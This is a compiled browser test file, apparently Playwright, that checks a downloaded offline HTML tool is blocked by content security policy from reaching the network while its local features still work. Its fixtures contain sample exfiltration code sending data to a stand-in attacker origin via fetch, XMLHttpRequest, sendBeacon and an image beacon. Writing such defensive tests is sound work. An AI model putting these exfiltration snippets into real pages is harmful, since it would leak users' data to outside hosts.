// 01223f3cd05b184a202df9af5a3314948049c743
import { expect, test } from '../../fixtures/test-options';
import { EXFIL_ORIGIN } from '../../support/policy';

/**
 * TC-CSP* — the product promise, asserted where it actually has to hold: a
 * published file opened from the local filesystem, with no server and no header
 * available. Covers AC-54 (network denied) and AC-55 (generated downloads work).
 *
 * Runs on chromium, firefox and webkit. ED-1 answered Chrome and Firefox by hand
 * and left WebKit open; this suite is what closes it and keeps it closed.
 */

const tool = body => `<!doctype html>
<html lang="en">
  <head><title>Fixture tool</title></head>
  <body>
    <h1>Fixture tool</h1>
    <p id="log">idle</p>
    <script>
      const log = (m) => { document.getElementById('log').textContent = m; };
      ${body}
    </script>
  </body>
</html>`;
const settle = async (violations, expected) => {
  await expect.poll(() => violations.length, {
    timeout: 5000
  }).toBeGreaterThanOrEqual(expected);
};
test.describe('a downloaded tool cannot reach the network', () => {
  test('TC-CSP01: fetch to an external origin is refused @csp @safety', async ({
    openPublished,
    violations,
    reached,
    failures
  }) => {
    await openPublished(tool(`fetch('${EXFIL_ORIGIN}/steal').catch(() => log('rejected'));`));
    await settle(violations, 1);
    expect(violations.map(v => v.directive)).toContain('connect-src');
    // The "and not" half: nothing came back, so nothing got out.
    expect(reached).toEqual([]);

    // How each engine words the refusal, recorded rather than asserted — the
    // wording is not a contract, but a change in it is worth seeing.
    test.info().annotations.push({
      type: 'refusal',
      description: JSON.stringify(failures)
    });
  });
  test('TC-CSP02: XMLHttpRequest to an external origin is refused @csp @safety', async ({
    openPublished,
    violations,
    reached
  }) => {
    await openPublished(tool(`
        try {
          const xhr = new XMLHttpRequest();
          xhr.open('POST', '${EXFIL_ORIGIN}/steal');
          xhr.send('data');
        } catch (e) { log('threw'); }
      `));
    await settle(violations, 1);
    expect(violations.map(v => v.directive)).toContain('connect-src');
    expect(reached).toEqual([]);
  });
  test('TC-CSP03: sendBeacon is refused regardless of what it returns @csp @safety', async ({
    page,
    openPublished,
    violations,
    reached
  }) => {
    await openPublished(tool(`log(String(navigator.sendBeacon('${EXFIL_ORIGIN}/steal', 'data')));`));
    await settle(violations, 1);
    expect(violations.map(v => v.directive)).toContain('connect-src');
    expect(reached).toEqual([]);

    // ED-1: Chrome reported `true` here for a request CSP had blocked, Firefox
    // reported `false`. The value is recorded and deliberately not asserted on —
    // if a future test starts trusting it, RULE-18 has been broken.
    const reported = await page.getByText(/true|false/).textContent();
    test.info().annotations.push({
      type: 'sendBeacon returned',
      description: String(reported)
    });
  });
  test('TC-CSP04: an external image is refused @csp @safety', async ({
    openPublished,
    violations,
    reached
  }) => {
    await openPublished(tool(`
        const img = new Image();
        img.onerror = () => log('error');
        img.src = '${EXFIL_ORIGIN}/pixel.png?leak=' + encodeURIComponent(document.title);
        document.body.append(img);
      `));
    await settle(violations, 1);
    expect(violations.map(v => v.directive)).toContain('img-src');
    expect(reached).toEqual([]);
  });
  test('TC-CSP05: eval is refused @csp @safety', async ({
    openPublished,
    violations
  }) => {
    await openPublished(tool(`try { eval('1 + 1'); log('ran'); } catch (e) { log('blocked'); }`));
    await settle(violations, 1);
    expect(violations.map(v => v.directive)).toContain('script-src');
  });
});
test.describe('a downloaded tool still works', () => {
  test('TC-CSP06: inline script runs @csp', async ({
    page,
    openPublished,
    violations
  }) => {
    await openPublished(tool(`log('inline ran');`));
    await expect(page.getByText('inline ran')).toBeVisible();
    expect(violations).toEqual([]);
  });
  test('TC-CSP07: data: and blob: images load @csp', async ({
    page,
    openPublished
  }) => {
    await openPublished(tool(`
        const px = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
        const fromData = new Image();
        fromData.alt = 'data image';
        fromData.src = px;
        const fromBlob = new Image();
        fromBlob.alt = 'blob image';
        fromBlob.src = URL.createObjectURL(new Blob([Uint8Array.from(atob(px.split(',')[1]), c => c.charCodeAt(0))], { type: 'image/gif' }));
        document.body.append(fromData, fromBlob);
      `));
    for (const alt of ['data image', 'blob image']) {
      const image = page.getByRole('img', {
        name: alt
      });
      await expect(image).toBeVisible();
      await expect.poll(() => image.evaluate(el => el.naturalWidth)).toBeGreaterThan(0);
    }
  });
  test('TC-CSP08: a generated file downloads @csp @safety', async ({
    page,
    openPublished
  }) => {
    await openPublished(tool(`
        const a = document.createElement('a');
        a.href = URL.createObjectURL(new Blob(['result'], { type: 'text/plain' }));
        a.download = 'result.txt';
        a.textContent = 'Download result';
        document.body.append(a);
      `));
    const [download] = await Promise.all([page.waitForEvent('download'), page.getByRole('link', {
      name: 'Download result'
    }).click()]);
    expect(download.suggestedFilename()).toBe('result.txt');
  });
  test('TC-CSP09: localStorage persists across a reload @csp', async ({
    page,
    openPublished
  }) => {
    await openPublished(tool(`
        const seen = Number(localStorage.getItem('runs') ?? '0') + 1;
        localStorage.setItem('runs', String(seen));
        log('runs: ' + seen);
      `));
    await expect(page.getByText('runs: 1')).toBeVisible();

    // Reloading before the write is observable makes this test lose a race it is
    // not trying to test: the second run then reads nothing and counts 1 again.
    // The property under test is that storage survives a reload, not how quickly
    // it is flushed, so wait for the value to be readable before reloading.
    await expect.poll(() => page.evaluate(() => localStorage.getItem('runs'))).toBe('1');
    await page.reload();
    await expect(page.getByText('runs: 2')).toBeVisible();
  });
});
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJuYW1lcyI6WyJleHBlY3QiLCJ0ZXN0IiwiRVhGSUxfT1JJR0lOIiwidG9vbCIsImJvZHkiLCJzZXR0bGUiLCJ2aW9sYXRpb25zIiwiZXhwZWN0ZWQiLCJwb2xsIiwibGVuZ3RoIiwidGltZW91dCIsInRvQmVHcmVhdGVyVGhhbk9yRXF1YWwiLCJkZXNjcmliZSIsIm9wZW5QdWJsaXNoZWQiLCJyZWFjaGVkIiwiZmFpbHVyZXMiLCJtYXAiLCJ2IiwiZGlyZWN0aXZlIiwidG9Db250YWluIiwidG9FcXVhbCIsImluZm8iLCJhbm5vdGF0aW9ucyIsInB1c2giLCJ0eXBlIiwiZGVzY3JpcHRpb24iLCJKU09OIiwic3RyaW5naWZ5IiwicGFnZSIsInJlcG9ydGVkIiwiZ2V0QnlUZXh0IiwidGV4dENvbnRlbnQiLCJTdHJpbmciLCJ0b0JlVmlzaWJsZSIsImFsdCIsImltYWdlIiwiZ2V0QnlSb2xlIiwibmFtZSIsImV2YWx1YXRlIiwiZWwiLCJuYXR1cmFsV2lkdGgiLCJ0b0JlR3JlYXRlclRoYW4iLCJkb3dubG9hZCIsIlByb21pc2UiLCJhbGwiLCJ3YWl0Rm9yRXZlbnQiLCJjbGljayIsInN1Z2dlc3RlZEZpbGVuYW1lIiwidG9CZSIsImxvY2FsU3RvcmFnZSIsImdldEl0ZW0iLCJyZWxvYWQiXSwic291cmNlcyI6WyJkb3dubG9hZGVkLXRvb2wuc3BlYy50cyJdLCJzb3VyY2VzQ29udGVudCI6WyJpbXBvcnQgeyBleHBlY3QsIHRlc3QgfSBmcm9tICcuLi8uLi9maXh0dXJlcy90ZXN0LW9wdGlvbnMnO1xuaW1wb3J0IHsgRVhGSUxfT1JJR0lOIH0gZnJvbSAnLi4vLi4vc3VwcG9ydC9wb2xpY3knO1xuXG4vKipcbiAqIFRDLUNTUCog4oCUIHRoZSBwcm9kdWN0IHByb21pc2UsIGFzc2VydGVkIHdoZXJlIGl0IGFjdHVhbGx5IGhhcyB0byBob2xkOiBhXG4gKiBwdWJsaXNoZWQgZmlsZSBvcGVuZWQgZnJvbSB0aGUgbG9jYWwgZmlsZXN5c3RlbSwgd2l0aCBubyBzZXJ2ZXIgYW5kIG5vIGhlYWRlclxuICogYXZhaWxhYmxlLiBDb3ZlcnMgQUMtNTQgKG5ldHdvcmsgZGVuaWVkKSBhbmQgQUMtNTUgKGdlbmVyYXRlZCBkb3dubG9hZHMgd29yaykuXG4gKlxuICogUnVucyBvbiBjaHJvbWl1bSwgZmlyZWZveCBhbmQgd2Via2l0LiBFRC0xIGFuc3dlcmVkIENocm9tZSBhbmQgRmlyZWZveCBieSBoYW5kXG4gKiBhbmQgbGVmdCBXZWJLaXQgb3BlbjsgdGhpcyBzdWl0ZSBpcyB3aGF0IGNsb3NlcyBpdCBhbmQga2VlcHMgaXQgY2xvc2VkLlxuICovXG5cbmNvbnN0IHRvb2wgPSAoYm9keTogc3RyaW5nKSA9PiBgPCFkb2N0eXBlIGh0bWw+XG48aHRtbCBsYW5nPVwiZW5cIj5cbiAgPGhlYWQ+PHRpdGxlPkZpeHR1cmUgdG9vbDwvdGl0bGU+PC9oZWFkPlxuICA8Ym9keT5cbiAgICA8aDE+Rml4dHVyZSB0b29sPC9oMT5cbiAgICA8cCBpZD1cImxvZ1wiPmlkbGU8L3A+XG4gICAgPHNjcmlwdD5cbiAgICAgIGNvbnN0IGxvZyA9IChtKSA9PiB7IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2cnKS50ZXh0Q29udGVudCA9IG07IH07XG4gICAgICAke2JvZHl9XG4gICAgPC9zY3JpcHQ+XG4gIDwvYm9keT5cbjwvaHRtbD5gO1xuXG5jb25zdCBzZXR0bGUgPSBhc3luYyAodmlvbGF0aW9uczogdW5rbm93bltdLCBleHBlY3RlZDogbnVtYmVyKSA9PiB7XG4gIGF3YWl0IGV4cGVjdC5wb2xsKCgpID0+IHZpb2xhdGlvbnMubGVuZ3RoLCB7IHRpbWVvdXQ6IDVfMDAwIH0pLnRvQmVHcmVhdGVyVGhhbk9yRXF1YWwoZXhwZWN0ZWQpO1xufTtcblxudGVzdC5kZXNjcmliZSgnYSBkb3dubG9hZGVkIHRvb2wgY2Fubm90IHJlYWNoIHRoZSBuZXR3b3JrJywgKCkgPT4ge1xuICB0ZXN0KCdUQy1DU1AwMTogZmV0Y2ggdG8gYW4gZXh0ZXJuYWwgb3JpZ2luIGlzIHJlZnVzZWQgQGNzcCBAc2FmZXR5JywgYXN5bmMgKHtcbiAgICBvcGVuUHVibGlzaGVkLFxuICAgIHZpb2xhdGlvbnMsXG4gICAgcmVhY2hlZCxcbiAgICBmYWlsdXJlcyxcbiAgfSkgPT4ge1xuICAgIGF3YWl0IG9wZW5QdWJsaXNoZWQodG9vbChgZmV0Y2goJyR7RVhGSUxfT1JJR0lOfS9zdGVhbCcpLmNhdGNoKCgpID0+IGxvZygncmVqZWN0ZWQnKSk7YCkpO1xuXG4gICAgYXdhaXQgc2V0dGxlKHZpb2xhdGlvbnMsIDEpO1xuICAgIGV4cGVjdCh2aW9sYXRpb25zLm1hcCgodikgPT4gdi5kaXJlY3RpdmUpKS50b0NvbnRhaW4oJ2Nvbm5lY3Qtc3JjJyk7XG4gICAgLy8gVGhlIFwiYW5kIG5vdFwiIGhhbGY6IG5vdGhpbmcgY2FtZSBiYWNrLCBzbyBub3RoaW5nIGdvdCBvdXQuXG4gICAgZXhwZWN0KHJlYWNoZWQpLnRvRXF1YWwoW10pO1xuXG4gICAgLy8gSG93IGVhY2ggZW5naW5lIHdvcmRzIHRoZSByZWZ1c2FsLCByZWNvcmRlZCByYXRoZXIgdGhhbiBhc3NlcnRlZCDigJQgdGhlXG4gICAgLy8gd29yZGluZyBpcyBub3QgYSBjb250cmFjdCwgYnV0IGEgY2hhbmdlIGluIGl0IGlzIHdvcnRoIHNlZWluZy5cbiAgICB0ZXN0LmluZm8oKS5hbm5vdGF0aW9ucy5wdXNoKHsgdHlwZTogJ3JlZnVzYWwnLCBkZXNjcmlwdGlvbjogSlNPTi5zdHJpbmdpZnkoZmFpbHVyZXMpIH0pO1xuICB9KTtcblxuICB0ZXN0KCdUQy1DU1AwMjogWE1MSHR0cFJlcXVlc3QgdG8gYW4gZXh0ZXJuYWwgb3JpZ2luIGlzIHJlZnVzZWQgQGNzcCBAc2FmZXR5JywgYXN5bmMgKHtcbiAgICBvcGVuUHVibGlzaGVkLFxuICAgIHZpb2xhdGlvbnMsXG4gICAgcmVhY2hlZCxcbiAgfSkgPT4ge1xuICAgIGF3YWl0IG9wZW5QdWJsaXNoZWQoXG4gICAgICB0b29sKGBcbiAgICAgICAgdHJ5IHtcbiAgICAgICAgICBjb25zdCB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtcbiAgICAgICAgICB4aHIub3BlbignUE9TVCcsICcke0VYRklMX09SSUdJTn0vc3RlYWwnKTtcbiAgICAgICAgICB4aHIuc2VuZCgnZGF0YScpO1xuICAgICAgICB9IGNhdGNoIChlKSB7IGxvZygndGhyZXcnKTsgfVxuICAgICAgYCksXG4gICAgKTtcblxuICAgIGF3YWl0IHNldHRsZSh2aW9sYXRpb25zLCAxKTtcbiAgICBleHBlY3QodmlvbGF0aW9ucy5tYXAoKHYpID0+IHYuZGlyZWN0aXZlKSkudG9Db250YWluKCdjb25uZWN0LXNyYycpO1xuICAgIGV4cGVjdChyZWFjaGVkKS50b0VxdWFsKFtdKTtcbiAgfSk7XG5cbiAgdGVzdCgnVEMtQ1NQMDM6IHNlbmRCZWFjb24gaXMgcmVmdXNlZCByZWdhcmRsZXNzIG9mIHdoYXQgaXQgcmV0dXJucyBAY3NwIEBzYWZldHknLCBhc3luYyAoe1xuICAgIHBhZ2UsXG4gICAgb3BlblB1Ymxpc2hlZCxcbiAgICB2aW9sYXRpb25zLFxuICAgIHJlYWNoZWQsXG4gIH0pID0+IHtcbiAgICBhd2FpdCBvcGVuUHVibGlzaGVkKFxuICAgICAgdG9vbChgbG9nKFN0cmluZyhuYXZpZ2F0b3Iuc2VuZEJlYWNvbignJHtFWEZJTF9PUklHSU59L3N0ZWFsJywgJ2RhdGEnKSkpO2ApLFxuICAgICk7XG5cbiAgICBhd2FpdCBzZXR0bGUodmlvbGF0aW9ucywgMSk7XG4gICAgZXhwZWN0KHZpb2xhdGlvbnMubWFwKCh2KSA9PiB2LmRpcmVjdGl2ZSkpLnRvQ29udGFpbignY29ubmVjdC1zcmMnKTtcbiAgICBleHBlY3QocmVhY2hlZCkudG9FcXVhbChbXSk7XG5cbiAgICAvLyBFRC0xOiBDaHJvbWUgcmVwb3J0ZWQgYHRydWVgIGhlcmUgZm9yIGEgcmVxdWVzdCBDU1AgaGFkIGJsb2NrZWQsIEZpcmVmb3hcbiAgICAvLyByZXBvcnRlZCBgZmFsc2VgLiBUaGUgdmFsdWUgaXMgcmVjb3JkZWQgYW5kIGRlbGliZXJhdGVseSBub3QgYXNzZXJ0ZWQgb24g4oCUXG4gICAgLy8gaWYgYSBmdXR1cmUgdGVzdCBzdGFydHMgdHJ1c3RpbmcgaXQsIFJVTEUtMTggaGFzIGJlZW4gYnJva2VuLlxuICAgIGNvbnN0IHJlcG9ydGVkID0gYXdhaXQgcGFnZS5nZXRCeVRleHQoL3RydWV8ZmFsc2UvKS50ZXh0Q29udGVudCgpO1xuICAgIHRlc3QuaW5mbygpLmFubm90YXRpb25zLnB1c2goeyB0eXBlOiAnc2VuZEJlYWNvbiByZXR1cm5lZCcsIGRlc2NyaXB0aW9uOiBTdHJpbmcocmVwb3J0ZWQpIH0pO1xuICB9KTtcblxuICB0ZXN0KCdUQy1DU1AwNDogYW4gZXh0ZXJuYWwgaW1hZ2UgaXMgcmVmdXNlZCBAY3NwIEBzYWZldHknLCBhc3luYyAoe1xuICAgIG9wZW5QdWJsaXNoZWQsXG4gICAgdmlvbGF0aW9ucyxcbiAgICByZWFjaGVkLFxuICB9KSA9PiB7XG4gICAgYXdhaXQgb3BlblB1Ymxpc2hlZChcbiAgICAgIHRvb2woYFxuICAgICAgICBjb25zdCBpbWcgPSBuZXcgSW1hZ2UoKTtcbiAgICAgICAgaW1nLm9uZXJyb3IgPSAoKSA9PiBsb2coJ2Vycm9yJyk7XG4gICAgICAgIGltZy5zcmMgPSAnJHtFWEZJTF9PUklHSU59L3BpeGVsLnBuZz9sZWFrPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpO1xuICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZChpbWcpO1xuICAgICAgYCksXG4gICAgKTtcblxuICAgIGF3YWl0IHNldHRsZSh2aW9sYXRpb25zLCAxKTtcbiAgICBleHBlY3QodmlvbGF0aW9ucy5tYXAoKHYpID0+IHYuZGlyZWN0aXZlKSkudG9Db250YWluKCdpbWctc3JjJyk7XG4gICAgZXhwZWN0KHJlYWNoZWQpLnRvRXF1YWwoW10pO1xuICB9KTtcblxuICB0ZXN0KCdUQy1DU1AwNTogZXZhbCBpcyByZWZ1c2VkIEBjc3AgQHNhZmV0eScsIGFzeW5jICh7IG9wZW5QdWJsaXNoZWQsIHZpb2xhdGlvbnMgfSkgPT4ge1xuICAgIGF3YWl0IG9wZW5QdWJsaXNoZWQodG9vbChgdHJ5IHsgZXZhbCgnMSArIDEnKTsgbG9nKCdyYW4nKTsgfSBjYXRjaCAoZSkgeyBsb2coJ2Jsb2NrZWQnKTsgfWApKTtcblxuICAgIGF3YWl0IHNldHRsZSh2aW9sYXRpb25zLCAxKTtcbiAgICBleHBlY3QodmlvbGF0aW9ucy5tYXAoKHYpID0+IHYuZGlyZWN0aXZlKSkudG9Db250YWluKCdzY3JpcHQtc3JjJyk7XG4gIH0pO1xufSk7XG5cbnRlc3QuZGVzY3JpYmUoJ2EgZG93bmxvYWRlZCB0b29sIHN0aWxsIHdvcmtzJywgKCkgPT4ge1xuICB0ZXN0KCdUQy1DU1AwNjogaW5saW5lIHNjcmlwdCBydW5zIEBjc3AnLCBhc3luYyAoeyBwYWdlLCBvcGVuUHVibGlzaGVkLCB2aW9sYXRpb25zIH0pID0+IHtcbiAgICBhd2FpdCBvcGVuUHVibGlzaGVkKHRvb2woYGxvZygnaW5saW5lIHJhbicpO2ApKTtcblxuICAgIGF3YWl0IGV4cGVjdChwYWdlLmdldEJ5VGV4dCgnaW5saW5lIHJhbicpKS50b0JlVmlzaWJsZSgpO1xuICAgIGV4cGVjdCh2aW9sYXRpb25zKS50b0VxdWFsKFtdKTtcbiAgfSk7XG5cbiAgdGVzdCgnVEMtQ1NQMDc6IGRhdGE6IGFuZCBibG9iOiBpbWFnZXMgbG9hZCBAY3NwJywgYXN5bmMgKHsgcGFnZSwgb3BlblB1Ymxpc2hlZCB9KSA9PiB7XG4gICAgYXdhaXQgb3BlblB1Ymxpc2hlZChcbiAgICAgIHRvb2woYFxuICAgICAgICBjb25zdCBweCA9ICdkYXRhOmltYWdlL2dpZjtiYXNlNjQsUjBsR09EbGhBUUFCQUlBQUFBQUFBUC8vL3lINUJBRUFBQUFBTEFBQUFBQUJBQUVBQUFJQlJBQTcnO1xuICAgICAgICBjb25zdCBmcm9tRGF0YSA9IG5ldyBJbWFnZSgpO1xuICAgICAgICBmcm9tRGF0YS5hbHQgPSAnZGF0YSBpbWFnZSc7XG4gICAgICAgIGZyb21EYXRhLnNyYyA9IHB4O1xuICAgICAgICBjb25zdCBmcm9tQmxvYiA9IG5ldyBJbWFnZSgpO1xuICAgICAgICBmcm9tQmxvYi5hbHQgPSAnYmxvYiBpbWFnZSc7XG4gICAgICAgIGZyb21CbG9iLnNyYyA9IFVSTC5jcmVhdGVPYmplY3RVUkwobmV3IEJsb2IoW1VpbnQ4QXJyYXkuZnJvbShhdG9iKHB4LnNwbGl0KCcsJylbMV0pLCBjID0+IGMuY2hhckNvZGVBdCgwKSldLCB7IHR5cGU6ICdpbWFnZS9naWYnIH0pKTtcbiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmQoZnJvbURhdGEsIGZyb21CbG9iKTtcbiAgICAgIGApLFxuICAgICk7XG5cbiAgICBmb3IgKGNvbnN0IGFsdCBvZiBbJ2RhdGEgaW1hZ2UnLCAnYmxvYiBpbWFnZSddKSB7XG4gICAgICBjb25zdCBpbWFnZSA9IHBhZ2UuZ2V0QnlSb2xlKCdpbWcnLCB7IG5hbWU6IGFsdCB9KTtcbiAgICAgIGF3YWl0IGV4cGVjdChpbWFnZSkudG9CZVZpc2libGUoKTtcbiAgICAgIGF3YWl0IGV4cGVjdFxuICAgICAgICAucG9sbCgoKSA9PiBpbWFnZS5ldmFsdWF0ZSgoZWw6IEhUTUxJbWFnZUVsZW1lbnQpID0+IGVsLm5hdHVyYWxXaWR0aCkpXG4gICAgICAgIC50b0JlR3JlYXRlclRoYW4oMCk7XG4gICAgfVxuICB9KTtcblxuICB0ZXN0KCdUQy1DU1AwODogYSBnZW5lcmF0ZWQgZmlsZSBkb3dubG9hZHMgQGNzcCBAc2FmZXR5JywgYXN5bmMgKHsgcGFnZSwgb3BlblB1Ymxpc2hlZCB9KSA9PiB7XG4gICAgYXdhaXQgb3BlblB1Ymxpc2hlZChcbiAgICAgIHRvb2woYFxuICAgICAgICBjb25zdCBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYScpO1xuICAgICAgICBhLmhyZWYgPSBVUkwuY3JlYXRlT2JqZWN0VVJMKG5ldyBCbG9iKFsncmVzdWx0J10sIHsgdHlwZTogJ3RleHQvcGxhaW4nIH0pKTtcbiAgICAgICAgYS5kb3dubG9hZCA9ICdyZXN1bHQudHh0JztcbiAgICAgICAgYS50ZXh0Q29udGVudCA9ICdEb3dubG9hZCByZXN1bHQnO1xuICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZChhKTtcbiAgICAgIGApLFxuICAgICk7XG5cbiAgICBjb25zdCBbZG93bmxvYWRdID0gYXdhaXQgUHJvbWlzZS5hbGwoW1xuICAgICAgcGFnZS53YWl0Rm9yRXZlbnQoJ2Rvd25sb2FkJyksXG4gICAgICBwYWdlLmdldEJ5Um9sZSgnbGluaycsIHsgbmFtZTogJ0Rvd25sb2FkIHJlc3VsdCcgfSkuY2xpY2soKSxcbiAgICBdKTtcblxuICAgIGV4cGVjdChkb3dubG9hZC5zdWdnZXN0ZWRGaWxlbmFtZSgpKS50b0JlKCdyZXN1bHQudHh0Jyk7XG4gIH0pO1xuXG4gIHRlc3QoJ1RDLUNTUDA5OiBsb2NhbFN0b3JhZ2UgcGVyc2lzdHMgYWNyb3NzIGEgcmVsb2FkIEBjc3AnLCBhc3luYyAoeyBwYWdlLCBvcGVuUHVibGlzaGVkIH0pID0+IHtcbiAgICBhd2FpdCBvcGVuUHVibGlzaGVkKFxuICAgICAgdG9vbChgXG4gICAgICAgIGNvbnN0IHNlZW4gPSBOdW1iZXIobG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3J1bnMnKSA/PyAnMCcpICsgMTtcbiAgICAgICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oJ3J1bnMnLCBTdHJpbmcoc2VlbikpO1xuICAgICAgICBsb2coJ3J1bnM6ICcgKyBzZWVuKTtcbiAgICAgIGApLFxuICAgICk7XG5cbiAgICBhd2FpdCBleHBlY3QocGFnZS5nZXRCeVRleHQoJ3J1bnM6IDEnKSkudG9CZVZpc2libGUoKTtcblxuICAgIC8vIFJlbG9hZGluZyBiZWZvcmUgdGhlIHdyaXRlIGlzIG9ic2VydmFibGUgbWFrZXMgdGhpcyB0ZXN0IGxvc2UgYSByYWNlIGl0IGlzXG4gICAgLy8gbm90IHRyeWluZyB0byB0ZXN0OiB0aGUgc2Vjb25kIHJ1biB0aGVuIHJlYWRzIG5vdGhpbmcgYW5kIGNvdW50cyAxIGFnYWluLlxuICAgIC8vIFRoZSBwcm9wZXJ0eSB1bmRlciB0ZXN0IGlzIHRoYXQgc3RvcmFnZSBzdXJ2aXZlcyBhIHJlbG9hZCwgbm90IGhvdyBxdWlja2x5XG4gICAgLy8gaXQgaXMgZmx1c2hlZCwgc28gd2FpdCBmb3IgdGhlIHZhbHVlIHRvIGJlIHJlYWRhYmxlIGJlZm9yZSByZWxvYWRpbmcuXG4gICAgYXdhaXQgZXhwZWN0LnBvbGwoKCkgPT4gcGFnZS5ldmFsdWF0ZSgoKSA9PiBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgncnVucycpKSkudG9CZSgnMScpO1xuXG4gICAgYXdhaXQgcGFnZS5yZWxvYWQoKTtcbiAgICBhd2FpdCBleHBlY3QocGFnZS5nZXRCeVRleHQoJ3J1bnM6IDInKSkudG9CZVZpc2libGUoKTtcbiAgfSk7XG59KTtcbiJdLCJtYXBwaW5ncyI6IkFBQUEsU0FBU0EsTUFBTSxFQUFFQyxJQUFJLFFBQVEsNkJBQTZCO0FBQzFELFNBQVNDLFlBQVksUUFBUSxzQkFBc0I7O0FBRW5EO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7O0FBRUEsTUFBTUMsSUFBSSxHQUFJQyxJQUFZLElBQUs7QUFDL0I7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQSxRQUFRQSxJQUFJO0FBQ1o7QUFDQTtBQUNBLFFBQVE7QUFFUixNQUFNQyxNQUFNLEdBQUcsTUFBQUEsQ0FBT0MsVUFBcUIsRUFBRUMsUUFBZ0IsS0FBSztFQUNoRSxNQUFNUCxNQUFNLENBQUNRLElBQUksQ0FBQyxNQUFNRixVQUFVLENBQUNHLE1BQU0sRUFBRTtJQUFFQyxPQUFPLEVBQUU7RUFBTSxDQUFDLENBQUMsQ0FBQ0Msc0JBQXNCLENBQUNKLFFBQVEsQ0FBQztBQUNqRyxDQUFDO0FBRUROLElBQUksQ0FBQ1csUUFBUSxDQUFDLDRDQUE0QyxFQUFFLE1BQU07RUFDaEVYLElBQUksQ0FBQywrREFBK0QsRUFBRSxPQUFPO0lBQzNFWSxhQUFhO0lBQ2JQLFVBQVU7SUFDVlEsT0FBTztJQUNQQztFQUNGLENBQUMsS0FBSztJQUNKLE1BQU1GLGFBQWEsQ0FBQ1YsSUFBSSxDQUFDLFVBQVVELFlBQVksd0NBQXdDLENB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